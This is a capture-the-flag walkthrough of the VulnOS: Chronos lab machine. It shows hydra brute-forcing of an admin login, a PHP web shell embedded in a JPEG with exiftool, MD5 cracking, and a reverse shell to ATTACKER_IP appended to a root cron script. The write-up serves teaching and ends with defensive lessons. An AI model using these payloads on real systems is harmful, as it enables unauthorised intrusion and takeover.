# VulnOS: Chronos – Hack & Ye Shall Receive 🗿

**Date:** 24 August 2025 <br/>
**Target:** VulnOS: Chronos <br/>
**IP:** `10.0.128.13` (My Target IP in this Walkthrough) <br/>
**Difficulty:** Medium (but fun to chain 😈)

<img width="532" height="460" alt="Cover" src="https://github.com/user-attachments/assets/72b50009-02a4-4c2f-9b22-1ddd0169c191" /> <br/>

---

## 1. TL;DR 🧾

We popped this box wide open—started with some **old-school recon**, found a spicy `robots.txt` leak, bruteforced an admin panel (because why not 🗿), abused a **jpg-only upload filter** with a polyglot PHP shell (classic), pivoted from **www-data → james**, and finally **yeeted into root** via a misconfigured cron job.

Flags captured:

* **User Flag:** `/home/james/user.txt`
* **Root Flag:** `/root/root.txt`

---

## 2. Scope (Keep it Tight)

* Target: `10.0.128.13`
* Only this VM. No neighbors were harmed (this time 🗿).

---

## 3. Game Plan (and Toys)

### Methodology:

* Recon & Enumeration
* Web Exploitation
* Pivot & Hash Crackin’
* Priv Escalation
* Loot & Bounce

### Tools I Rolled With:

* `nmap` – Obvious first date
* `gobuster` – For snoopin’
* `hydra` – For that good ol’ brute 🗿
* `exiftool` – Shell stuffing
* `nc` – Listener gang
* `sqlite3` – Database peepin’
* `john` – Hash demolition

---

## 4. Walkthrough of Doom

### 4.1 Recon – The Boring But Necessary Foreplay

Visited the IP: meh… corporate-y fluff and an admin portal at `/admin_login.php`.
<img width="1918" height="1078" alt="1" src="https://github.com/user-attachments/assets/cee428cc-f1bb-446d-ac08-0e24a6199ba3" /> <br/>

🗿 **Fire up Nmap:**

```bash
nmap -sV -A 10.0.128.13 -sC
```

<img width="943" height="835" alt="2" src="https://github.com/user-attachments/assets/e9ef3ba5-6518-419f-9fad-63316d386469" /> <br/>

Boom:

```
22/tcp open  ssh  OpenSSH 8.9p1
80/tcp open  http Apache 2.4.52
robots.txt → /assets/ /staff_portal.html
```

I also ran gobuster additionally though.

<img width="775" height="962" alt="3" src="https://github.com/user-attachments/assets/65fa0c1a-7290-45bd-a512-df888f6ebbb7" /> <br/>

Staff portal had:

```
System Administrator: j.adams
```

<img width="860" height="292" alt="4" src="https://github.com/user-attachments/assets/cd537885-31ae-4d06-b5db-53227b3704cd" /> <br/>

Aha. Got a name. File it.

---

### 4.2 Admin Portal – Bruteforce That Boy

Portal’s here: `http://10.0.128.13/admin_login.php`

<img width="1912" height="1045" alt="5" src="https://github.com/user-attachments/assets/08f24905-80c9-4d10-86cf-57cfba847d1f" /> <br/>

🗿 **Hydra go brrrr:**

```bash
hydra -l j.adams -P rockyou.txt 10.0.128.13 http-post-form "/admin_login.php:username=^USER^&password=^PASS^:Incorrect Password"
```

**Win:**

```
j.adams : sunshine1
```

<img width="1895" height="292" alt="6" src="https://github.com/user-attachments/assets/e2f81bc5-6798-4a8e-8d00-a47bbf9d1532" /> <br/>

Logged in. Meh panel, but there's an **upload feature**. Only accepts `.jpg` huh? Hehe… cute.

---

### 4.3 Shell Time – Polyglot Style

Pulled out the ol’ `exiftool` trick:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
mv image.jpg shell.php.jpg
```

<img width="822" height="281" alt="9" src="https://github.com/user-attachments/assets/3e236169-54ab-4d37-afcf-9618a16e46f0" /> <br/>

Listener:

```bash
nc -lvnp 4444
```

Uploaded, triggered… 🥂
Reverse shell as **www-data**: *secured.*

---

### 4.4 Pivot to james – The Real User

Snooped around: `/var/www/db/database.sqlite` 👀

Dumped it:

```bash
sqlite3 /var/www/db/database.sqlite ".dump"
```

Got an MD5 hash:

```
b6a19c6910f2fd643725aa9edfb8b4be
```

Fed it to John:

```bash
john --wordlist=rockyou.txt hash.txt
```

Cracked:

```
supersecret123
```

Switched:

```bash
su james
```

Flagged:

```bash
cat /home/james/user.txt
CHRONOS{w34k_p455w0rd_&_us3r_3num_l3d_2_th1s}
```

---

### 4.5 PrivEsc – James → Root (Cron Job of Destiny)

Checked cron:

```bash
cat /etc/crontab
```

Found:

```
/opt/scripts/backup.sh (runs as root every 3 mins)
```

Permissions? Group-writable. And guess what? `james` is in that group. 🗿

Injected my little root spawner:

```bash
echo "bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'" >> /opt/scripts/backup.sh
```

Listener:

```bash
nc -lvnp 5555
```

Waited a bit… *ding!* Root shell inbound.

Root loot:

```bash
cat /root/root.txt
CHRONOS{gr0up_p3rm5_0n_cr0n_4r3_d4ng3r0us}
```

<img width="540" height="462" alt="Done" src="https://github.com/user-attachments/assets/3b987c67-b223-4a26-bb6a-79b0014e0501" />

**Congrats! Another CTF Pwned🥳**

---

## 5. How This Box Got Wrecked

* **robots.txt snitchin’**
* Weak login feedback → Username enumeration
* Password was *sunshine1* (bro 💀)
* Upload filter was a joke
* MD5 in DB = 🤦‍♂️
* Cron job with loose perms = Root buffet

---

## 6. Lessons Served

* Don’t leave sensitive paths in `robots.txt` (bots aren’t the only readers 🗿)
* Enforce better password policies
* Validate uploads server-side, not just extension-checking
* Hashes ≠ Secure storage (especially MD5)
* Cron jobs + lax perms = welcome mat for hackers

---

**Pwned by:** *Aditya Bhatt*
*Top 2% TryHackMe | VAPT Specialist | Occasional Menace* 🗿

---
